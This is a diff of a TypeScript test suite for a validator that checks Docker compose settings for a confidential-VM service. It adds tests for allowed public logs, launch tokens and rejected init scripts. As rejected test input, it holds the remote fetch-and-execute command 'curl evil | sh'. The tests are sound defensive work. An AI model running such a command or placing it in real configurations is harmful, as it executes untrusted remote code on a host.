@@ -46,9 +46,13 @@ describe('checkAppCompose', () => {
     expect(checkCompose(withService((s) => { s['image'] = `mirror.example/tee-seller@${TEST_IMAGE.digest}` }))).not.toHaveProperty('error')
   })
 
-  it('rejects app-level settings that run code or expose logs outside the image', () => {
+  it('rejects app-level settings that run code outside the image, and allows public logs', () => {
     expect(checkCompose(referenceCompose(), { pre_launch_script: 'curl evil | sh' })).toMatchObject({ error: expect.stringMatching(/pre-launch/) })
-    expect(checkCompose(referenceCompose(), { public_logs: true })).toMatchObject({ error: expect.stringMatching(/logs/) })
+    // The image runs the seller in content-free mode, so its logs hold no prompts.
+    expect(checkCompose(referenceCompose(), { public_logs: true })).not.toHaveProperty('error')
+    // Phala Cloud sets it; it only stops the CVM from booting without the matching launch token.
+    expect(checkCompose(referenceCompose(), { launch_token_hash: 'ab'.repeat(32) })).not.toHaveProperty('error')
+    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash', bash_script: 'x' })).toMatchObject({ error: expect.stringMatching(/bash_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash' })).toMatchObject({ error: expect.stringMatching(/docker compose/) })
   })
@@ -75,6 +79,7 @@ describe('checkAppCompose', () => {
   it('hides only secrets that cannot redirect prompts', () => {
     const env = (e: Obj) => checkCompose(withService((s) => { s['environment'] = { ...s['environment'], ...e } }))
     expect(env({ ANTSEED_BASE_RPC_URL: '${ANTSEED_BASE_RPC_URL}' })).not.toHaveProperty('error')
+    expect(env({ ANTSEED_BASE_RPC_URL: 'https://mainnet.base.org' })).not.toHaveProperty('error')
     expect(env({ ANTSEED_VERIFIER_PROVIDER_EVIDENCE_URL: 'https://provider.example/attest?nonce={nonce}' })).not.toHaveProperty('error')
     expect(env({ OPENAI_BASE_URL: '${OPENAI_BASE_URL}' })).toMatchObject({ error: expect.stringMatching(/OPENAI_BASE_URL may not come from a hidden variable/) })
     expect(env({ HTTPS_PROXY: '${HTTPS_PROXY}' })).toMatchObject({ error: expect.stringMatching(/hidden variable/) })
